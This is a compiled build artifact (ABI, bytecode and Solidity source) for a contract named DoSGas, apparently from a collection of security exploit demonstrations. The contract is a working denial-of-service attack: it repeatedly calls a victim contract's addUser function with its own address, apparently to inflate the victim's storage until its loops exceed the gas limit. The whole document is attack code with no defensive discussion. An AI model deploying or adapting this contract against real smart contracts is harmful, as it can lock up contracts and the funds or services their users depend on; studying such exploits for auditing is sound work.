{
  "contractName": "DoSGas",
  "abi": [
    {
      "constant": false,
      "inputs": [
        {
          "name": "victim",
          "type": "address"
        },
        {
          "name": "loops",
          "type": "uint256"
        }
      ],
      "name": "addUsers",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b50610194806100206000396000f300608060405260043610610041576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff16806371c6e04914610046575b600080fd5b34801561005257600080fd5b50610091600480360381019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050610093565b005b60008290505b6000821115610163578073ffffffffffffffffffffffffffffffffffffffff1663421b2d8b306040518263ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001915050600060405180830381600087803b15801561013d57600080fd5b505af1158015610151573d6000803e3d6000fd5b50505050818060019003925050610099565b5050505600a165627a7a72305820ad87fedf163ae2c9af417ca722b81f1a606520cd76bd0142e5f275879a45ce4d0029",
  "source": "pragma solidity ^0.4.19;\n\ncontract DoSGas {\n  function addUsers(address victim, uint256 loops) {\n    Victim _victim = Victim(victim);\n    while (loops > 0) {\n      _victim.addUser(this);\n      loops--;\n    }\n  }\n}\n\ncontract Victim {\n  function addUser(address _user);\n}",
  "sourcePath": "/home/hayek/proj/security-exploits/contracts/DoSGas/DoSGas.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.23+commit.124ca40d.Emscripten.clang"
  },
  "schemaVersion": "2.0.0",
  "updatedAt": "2018-06-24T04:16:54.711Z"
}